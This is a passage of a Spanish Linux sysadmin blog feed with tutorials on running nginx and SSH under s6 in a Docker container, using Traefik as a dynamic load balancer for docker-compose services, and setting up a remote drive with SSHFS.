&lt;p&gt;El primer paso es definir la carpeta de servicios, de donde va a leer &lt;code&gt;s6-svscan&lt;/code&gt;. En este ejemplo vamos a utilizar &lt;code&gt;/etc/s6&lt;/code&gt; y en ella vamos a definir:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;nginx/run&lt;/code&gt; &amp;rarr; para mantener levantado un servidor web &lt;strong&gt;nginx&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ssh/run&lt;/code&gt; &amp;rarr; para mantener el servidor SSH/SFTP levantado&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.s6-svscan/finish&lt;/code&gt; &amp;rarr; no hace nada, pero es para suprimir el &lt;em&gt;warning&lt;/em&gt; al acabar el contenedor&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/miniserver$ tree -a
.
├── s6
│   ├── nginx
│   │   └── run
│   ├── .s6-svscan
│   │   └── finish
│   └── ssh
│       └── run
├── Dockerfile
└── nginx.conf

&lt;span class="m"&gt;4&lt;/span&gt; directories, &lt;span class="m"&gt;5&lt;/span&gt; files
gerard@atlantis:~/workspace/miniserver$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: No ponemos &lt;em&gt;scripts&lt;/em&gt; de &lt;code&gt;finish&lt;/code&gt; en los servicios porque no queremos hacer nada cuando acaben, más allá de su reinicio por parte de &lt;strong&gt;s6&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si la caída de un servicio es suficientemente grave como para querer parar el contenedor, podéis poner &lt;code&gt;s6-svscanctl -t /etc/s6&lt;/code&gt; en el script &lt;code&gt;finish&lt;/code&gt; de ese servicio para parar &lt;strong&gt;s6&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Lo importante de los &lt;em&gt;scripts&lt;/em&gt; de &lt;code&gt;run&lt;/code&gt; es que no acaben, lo que se interpreta como servicio acabado (y candidato a levantar de nuevo). Este paradigma no nos es nuevo en &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En cuanto a los &lt;em&gt;scripts&lt;/em&gt; en sí mismos, no hacen nada especialmente complicado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/miniserver$ cat s6/nginx/run
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@atlantis:~/workspace/miniserver$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/miniserver$ cat s6/ssh/run
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; key in rsa ecdsa ed25519&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="nb"&gt;test&lt;/span&gt; -e /etc/ssh/ssh_host_&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;key&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;_key &lt;span class="o"&gt;||&lt;/span&gt; ssh-keygen -t &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;key&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -N &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; -f /etc/ssh/ssh_host_&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;key&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;_key -q
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/sshd -D -e
gerard@atlantis:~/workspace/miniserver$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/miniserver$ cat s6/.s6-svscan/finish
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;
gerard@atlantis:~/workspace/miniserver$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El único &lt;em&gt;script&lt;/em&gt; que hace algo un poco más complejo es el de SSH, que se encarga de crear las &lt;em&gt;host keys&lt;/em&gt; si no hubiera ninguna, para que cada contenedor genere las suyas propias y no vengan en la imagen.&lt;/p&gt;
&lt;p&gt;En cuanto a la imagen, se necesita que todos los comandos usados funcionen en el contenedor. Esto nos obliga a instalar los paquetes y configuraciones como es habitual. La parte propia de &lt;strong&gt;s6&lt;/strong&gt; se limita a tres cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Instalar el paquete &lt;strong&gt;s6&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Crear su carpeta de servicios en &lt;code&gt;/etc/s6&lt;/code&gt;, en este caso mediante copia de los scripts&lt;/li&gt;
&lt;li&gt;Indicar que el comando a ejectuar será &lt;code&gt;s6-svscan /etc/s6&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así quedaría el &lt;code&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/miniserver$ cat Dockerfile
FROM alpine:3.8

&lt;span class="c1"&gt;# ssh daemon&lt;/span&gt;
RUN apk add --no-cache openssh &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    adduser -D gerard &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;gerard:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd

&lt;span class="c1"&gt;# nginx server&lt;/span&gt;
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /etc/nginx/conf.d/default.conf &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    install -d -o gerard -g gerard -m &lt;span class="m"&gt;755&lt;/span&gt; /srv/www
COPY nginx.conf /etc/nginx/

&lt;span class="c1"&gt;# s6 supervision tools&lt;/span&gt;
RUN apk add --no-cache s6
COPY s6 /etc/s6
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/s6-svscan&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;/etc/s6&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/workspace/miniserver$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por tener el ejemplo completo, y aunque no tiene nada que ver con &lt;strong&gt;s6&lt;/strong&gt;, incluyo también la configuración de &lt;strong&gt;nginx&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/miniserver$ cat nginx.conf
worker_processes &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

events &lt;span class="o"&gt;{&lt;/span&gt;
        worker_connections &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

http &lt;span class="o"&gt;{&lt;/span&gt;
        include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
        default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
        sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
        keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        server &lt;span class="o"&gt;{&lt;/span&gt;
                listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                server_name _&lt;span class="p"&gt;;&lt;/span&gt;
                root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;
                index index.html&lt;span class="p"&gt;;&lt;/span&gt;
                error_page &lt;span class="m"&gt;404&lt;/span&gt; /404.html&lt;span class="p"&gt;;&lt;/span&gt;

                location /404.html &lt;span class="o"&gt;{&lt;/span&gt;
                        internal&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/workspace/miniserver$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos quedaría publicar los puertos de una forma inteligente, subir contenido por SFTP o SCP en &lt;code&gt;/srv/www&lt;/code&gt;, y observar el resultado en el navegador.&lt;/p&gt;</content><category term="docker"></category><category term="s6"></category><category term="nginx"></category><category term="ssh"></category></entry><entry><title>Un balanceador dinámico para Docker: traefik</title><link href="http://www.linuxsysadmin.ml/2018/09/un-balanceador-dinamico-para-docker-traefik.html" rel="alternate"></link><published>2018-09-17T10:00:00+02:00</published><updated>2018-09-17T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-09-17:/2018/09/un-balanceador-dinamico-para-docker-traefik.html</id><summary type="html">&lt;p&gt;Cuando escalamos nuestros servicios o añadimos nuevos en &lt;strong&gt;Docker&lt;/strong&gt;, suele ser un problema la configuración del balanceador. Se necesita modificar su configuración y reiniciarlo para que la nueva configuración aplique. Con el tiempo han aparecido nuevas soluciones para simplificar estos casos, con configuraciones dinámicas. Una de estas soluciones es &lt;strong&gt;Traefik …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando escalamos nuestros servicios o añadimos nuevos en &lt;strong&gt;Docker&lt;/strong&gt;, suele ser un problema la configuración del balanceador. Se necesita modificar su configuración y reiniciarlo para que la nueva configuración aplique. Con el tiempo han aparecido nuevas soluciones para simplificar estos casos, con configuraciones dinámicas. Una de estas soluciones es &lt;strong&gt;Traefik&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Traefik&lt;/strong&gt; es un proxy reverso y balanceador moderno que facilita el despliegue de microservicios. Se integra con algunos componentes de nuestra infraestructura (&lt;strong&gt;Docker&lt;/strong&gt;, &lt;strong&gt;Docker Swarm&lt;/strong&gt;, &lt;strong&gt;Kubernetes&lt;/strong&gt;, &lt;strong&gt;Consul&lt;/strong&gt;, &lt;strong&gt;Amazon ECS&lt;/strong&gt;, ...) y se configura automáticamente leyendo sus metadatos. Suele bastar con apuntar &lt;strong&gt;Traefik&lt;/strong&gt; al orquestador que usemos.&lt;/p&gt;
&lt;h2&gt;Un ejemplo con Docker&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Traefik&lt;/strong&gt; es un binario único hecho en lenguaje &lt;strong&gt;Go&lt;/strong&gt; y como viene siendo habitual, lo podemos instalar simplemente "tirándolo por ahí". También se nos ofrece como una imagen oficial de &lt;strong&gt;Docker&lt;/strong&gt;. Vamos a usar esta última por simplicidad.&lt;/p&gt;
&lt;p&gt;Lo primero que tenemos que tener en cuenta es que &lt;strong&gt;Traefik&lt;/strong&gt; va a pasar las peticiones a otros servicios, y para ello tiene que poder alcanzarlos. En el caso de &lt;strong&gt;Docker&lt;/strong&gt; sin cluster, los contenedores tienen conectividad si estan en la misma red. Eso se puede conseguir de dos formas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ponemos todos los servicios en el mismo &lt;em&gt;docker-compose.yml&lt;/em&gt; para que vayan todos a la misma red&lt;/li&gt;
&lt;li&gt;Definimos una red global para que varios &lt;em&gt;docker-compose.yml&lt;/em&gt; se encarguen solamente de sus servicios relevantes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Optamos por la segunda para separar los servicios por proyectos; así podemos reiniciarlos fácilmente sin afectar a sus vecinos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ docker network create global
ebd9af59c9d2c8e2ce61db17885b777a343a6b354465f2a5b4cddba5bf92b9b7
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El balanceador&lt;/h3&gt;
&lt;p&gt;Ahora necesitamos levantar el contenedor que va a ejecutar &lt;strong&gt;Traefik&lt;/strong&gt;, y por comodidad, lo haremos con &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ cat traefik/docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  traefik:
    image: traefik
    command: --api --docker --docker.exposedbydefault&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:80&amp;quot;&lt;/span&gt;
      - &lt;span class="s2"&gt;&amp;quot;8080:8080&amp;quot;&lt;/span&gt;
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
      - global
networks:
  global:
     external: &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Básicamente instruimos a &lt;strong&gt;Traefik&lt;/strong&gt; para que use &lt;strong&gt;Docker&lt;/strong&gt;, le mapeamos el &lt;em&gt;socket&lt;/em&gt; para que pueda consultar los metadatos de los servicios. Como detalle adicional levantamos el &lt;em&gt;dashboard&lt;/em&gt; con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--api&lt;/code&gt;, lo enchufamos a la red &lt;code&gt;global&lt;/code&gt; que hemos creado antes y -por preferencia personal- no exponemos ningún servicio por defecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; traefik/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-compose up -d&lt;span class="o"&gt;)&lt;/span&gt;
Creating traefik_traefik_1 ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya podemos acceder al &lt;em&gt;dashboard&lt;/em&gt; en &lt;a href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt;, aunque no tenemos ningún dominio registrado, con lo que obtendremos errores 404 en el puerto 80.&lt;/p&gt;
&lt;h3&gt;Un servicio de ejemplo&lt;/h3&gt;
&lt;p&gt;Para la demostración, vamos a utilizar una imagen que vuelca el &lt;em&gt;hostname&lt;/em&gt; el contenedor; eso nos sirve para verificar el balanceo. Como no quiero reinventar la rueda, y para agilizar, vamos a utilizar la imagen &lt;code&gt;emilevauge/whoami&lt;/code&gt; que podemos sacar de &lt;em&gt;DockerHub&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ cat whoami/docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  whoami:
    image: emilevauge/whoami
    labels:
      - &lt;span class="s2"&gt;&amp;quot;traefik.frontend.rule=Host:whoami.docker.localhost&amp;quot;&lt;/span&gt;
      - &lt;span class="s2"&gt;&amp;quot;traefik.enable=true&amp;quot;&lt;/span&gt;
    networks:
      - global
networks:
  global:
    external: &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un punto interesante de mencionar es que &lt;strong&gt;Traefik&lt;/strong&gt; viene con una configuración estándar, pero se puede modificar algunas cosas que afectan a los contenedores mediante &lt;em&gt;labels&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La más evidente es &lt;code&gt;traefik.enable&lt;/code&gt;, que sobreescribe el comportamiente de no exponer por defecto los servicios; con ello evitamos que se expongan servicios que no deseamos hacer públicos (bases de datos, depliegues bue-green, otros servicios, ...).&lt;/p&gt;
&lt;p&gt;Otra &lt;em&gt;label&lt;/em&gt; interesante es &lt;code&gt;traefik.frontend.rule&lt;/code&gt; que básicamente indica que este contenedor es uno de los miembros del &lt;em&gt;pool&lt;/em&gt; de balanceo cuando se pida el &lt;em&gt;host&lt;/em&gt; indicado. Una &lt;em&gt;label&lt;/em&gt; que podemos necesitar es &lt;code&gt;traefik.port&lt;/code&gt;, que indica contra que puerto del contenedor hay que lanzar las peticiones; por defecto se pasan al puerto 80 (que es donde escucha la imagen elegida).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Para una lista completa, podemos ir a &lt;a href="https://docs.traefik.io/configuration/backends/docker/#on-containers"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Levantamos el servicio con una sola instancia de momento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; whoami/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-compose up -d&lt;span class="o"&gt;)&lt;/span&gt;
Creating whoami_whoami_1 ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos que funciona como esperamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ curl http://localhost:80/
&lt;span class="m"&gt;404&lt;/span&gt; page not found
gerard@atlantis:~/workspace$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: whoami.docker.localhost&amp;quot;&lt;/span&gt; http://localhost:80/
Hostname: 831400b7faf2
IP: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
IP: &lt;span class="m"&gt;172&lt;/span&gt;.25.0.3
GET / HTTP/1.1
Host: whoami.docker.localhost
User-Agent: curl/7.52.1
Accept: */*
Accept-Encoding: gzip
X-Forwarded-For: &lt;span class="m"&gt;172&lt;/span&gt;.25.0.1
X-Forwarded-Host: whoami.docker.localhost
X-Forwarded-Port: &lt;span class="m"&gt;80&lt;/span&gt;
X-Forwarded-Proto: http
X-Forwarded-Server: dd0bdbb8d6fb
X-Real-Ip: &lt;span class="m"&gt;172&lt;/span&gt;.25.0.1

gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y vemos como, sin tocar el balanceador, ha aparecido un nuevo &lt;em&gt;virtualhost&lt;/em&gt; que pasa las peticiones a nuestro contenedor. Ahora vamos a escalar el servicio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; whoami/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-compose up -d --scale &lt;span class="nv"&gt;whoami&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
Starting whoami_whoami_1 ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating whoami_whoami_2 ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating whoami_whoami_3 ... &lt;span class="k"&gt;done&lt;/span&gt;
Creating whoami_whoami_4 ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y así sin tocar nada más, &lt;strong&gt;Traefik&lt;/strong&gt; se ha dado cuenta del cambio en el número de contenedores y ha añadido los 3 nuevos en el &lt;em&gt;pool&lt;/em&gt; de balanceo de &lt;code&gt;whoami.docker.localhost&lt;/code&gt;, como indican sus &lt;em&gt;labels&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ &lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="k"&gt;$(&lt;/span&gt;seq &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; curl -sH &lt;span class="s2"&gt;&amp;quot;Host: whoami.docker.localhost&amp;quot;&lt;/span&gt; http://localhost:80/ &lt;span class="p"&gt;|&lt;/span&gt; grep Hostname&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
Hostname: 831400b7faf2
Hostname: 7de8d5739178
Hostname: 01aa52cb5c66
Hostname: 4f64cac4a4d2
Hostname: 831400b7faf2
Hostname: 7de8d5739178
Hostname: 01aa52cb5c66
Hostname: 4f64cac4a4d2
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y estas son las &lt;em&gt;labels&lt;/em&gt; de cada contenedor:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace$ &lt;span class="k"&gt;for&lt;/span&gt; c in whoami_whoami_&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,2,3,4&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; docker inspect &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;c&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep traefik&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
whoami_whoami_1
                &lt;span class="s2"&gt;&amp;quot;traefik.enable&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;traefik.frontend.rule&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Host:whoami.docker.localhost&amp;quot;&lt;/span&gt;
whoami_whoami_2
                &lt;span class="s2"&gt;&amp;quot;traefik.enable&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;traefik.frontend.rule&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Host:whoami.docker.localhost&amp;quot;&lt;/span&gt;
whoami_whoami_3
                &lt;span class="s2"&gt;&amp;quot;traefik.enable&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;traefik.frontend.rule&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Host:whoami.docker.localhost&amp;quot;&lt;/span&gt;
whoami_whoami_4
                &lt;span class="s2"&gt;&amp;quot;traefik.enable&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;traefik.frontend.rule&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Host:whoami.docker.localhost&amp;quot;&lt;/span&gt;
gerard@atlantis:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: No es necesario que tengáis un solo tipo de contenedores con la &lt;em&gt;label&lt;/em&gt; del &lt;em&gt;host&lt;/em&gt;. Se puede hacer un balanceo de contenedores distintos, con distintos puertos y funciones. Esto es útil en el caso de un cambio de versión sin corte; basta con añadir la nueva versión con otro &lt;em&gt;docker-compose.yml&lt;/em&gt; y retirar el servicio viejo poco después.&lt;/p&gt;
&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Con la facilidad que supone crear un &lt;em&gt;docker-compose.yml&lt;/em&gt; para añadir un nuevo &lt;em&gt;virtualhost&lt;/em&gt; en &lt;strong&gt;Traefik&lt;/strong&gt;, podemos desplegar servicios y microservicios sin mucha complicación, y sin estar pendientes del balanceador. Eso reduce la necesidad de un administrador dedicado, pero hace que las cosas se puedan descontrolar fácilmente.&lt;/p&gt;
&lt;p&gt;Cuando os déis cuenta que el servidor único con &lt;strong&gt;Docker&lt;/strong&gt; se os queda corto, váis a necesitar un cluster más adecuado, como &lt;strong&gt;Docker Swarm&lt;/strong&gt; o &lt;strong&gt;Kubernetes&lt;/strong&gt;. La integración de &lt;strong&gt;Traefik&lt;/strong&gt; con ambos es muy simple, y no váis a necesitar mucha más investigación.&lt;/p&gt;
&lt;p&gt;Cabe mencionar que &lt;strong&gt;Traefik&lt;/strong&gt; se integra también con varis servidores de SSL (por ejemplo &lt;strong&gt;LetsEncrypt&lt;/strong&gt;) y nos puede gestionar fácilmente la terminación SSL y las redirecciones de un protocolo a otro. Tampoco hemos hablado del magnífico &lt;em&gt;dashboard&lt;/em&gt; y de sus métricas; creo que os encantará verlo a vosotros mismos.&lt;/p&gt;</content><category term="traefik"></category><category term="docker"></category><category term="balanceador"></category></entry><entry><title>Una unidad de red remota con SSHFS</title><link href="http://www.linuxsysadmin.ml/2018/09/una-unidad-de-red-remota-con-sshfs.html" rel="alternate"></link><published>2018-09-10T10:00:00+02:00</published><updated>2018-09-10T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-09-10:/2018/09/una-unidad-de-red-remota-con-sshfs.html</id><summary type="html">&lt;p&gt;Es muy cómodo dejar un fichero en una carpeta local y saber que ese fichero está a salvo, en la nube; seguramente los que utilizáis un servicio de sincronización en la nube váis a estar de acuerdo. La empresas no suelen permitirlo, pero podéis utilizar un servicio local por &lt;strong&gt;SSH …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Es muy cómodo dejar un fichero en una carpeta local y saber que ese fichero está a salvo, en la nube; seguramente los que utilizáis un servicio de sincronización en la nube váis a estar de acuerdo. La empresas no suelen permitirlo, pero podéis utilizar un servicio local por &lt;strong&gt;SSH&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El ingenio se llama &lt;strong&gt;SSHFS&lt;/strong&gt; y lanza las operaciones de lectura y escritura contra una máquina remota que solamente debe ofrecer &lt;strong&gt;SSH&lt;/strong&gt;, de forma que para nosotros parece que se trate de un sistema de ficheros local.&lt;/p&gt;
&lt;h2&gt;El servidor&lt;/h2&gt;
&lt;p&gt;Para utilizar &lt;strong&gt;SSHFS&lt;/strong&gt; solo necesitamos un servidor que ofrezca &lt;strong&gt;SSH&lt;/strong&gt;, aunque también funciona por &lt;strong&gt;SFTP&lt;/strong&gt;. Como comodidad adicional, vamos a utilizar &lt;a href="http://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html"&gt;autenticacíon por claves&lt;/a&gt;. Como conisderación de seguridad, vamos a enjaular al usuario que guarde los datos y lo vamos a lmitar a &lt;strong&gt;SFTP&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Se asume que el servidor ya tiene el servidor &lt;strong&gt;SSH&lt;/strong&gt; instalado; de no ser así, basta con hacer un &lt;code&gt;sudo apt install openssh-server&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Lo primero es crear un usuario para que &lt;strong&gt;SSHFS&lt;/strong&gt; pueda entrar al servidor por &lt;strong&gt;SSH&lt;/strong&gt;/&lt;strong&gt;SFTP&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ sudo adduser nas
...
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Le asignamos la parte pública de la clave &lt;strong&gt;SSH&lt;/strong&gt; en el fichero &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; para evitar que tengamos que introducir la contraseña cada vez que montemos la carpeta remota en el cliente, y para evitar ataques de fuerza bruta.&lt;/p&gt;
